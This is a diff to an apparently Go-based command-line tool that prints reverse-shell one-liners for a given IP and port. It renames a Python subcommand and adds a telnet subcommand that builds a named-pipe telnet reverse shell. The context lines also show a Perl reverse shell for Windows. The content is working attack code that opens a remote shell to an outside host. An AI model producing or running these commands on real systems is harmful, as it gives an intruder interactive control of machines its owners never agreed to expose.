@@ -37,7 +37,7 @@ func main() {
 			},
 		},
 		{
-			Name:  "py",
+			Name:  "python",
 			Usage: "Generate a Python reverse shell",
 			Flags: myFlags,
 			Action: func(c *cli.Context) error {
@@ -93,6 +93,15 @@ func main() {
 				fmt.Print(fmt.Sprint(Magenta("-- for Windows:\n")))
 				fmt.Printf("perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n", c.String("ip"), c.String("port"))
 
+				return nil
+			},
+		},
+		{
+			Name:  "telnet",
+			Usage: "Generate telnet reverse shells",
+			Flags: myFlags,
+			Action: func(c *cli.Context) error {
+				fmt.Printf("rm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0/tmp/p\n", c.String("ip"), c.String("port"))
 				return nil
 			},
 		},
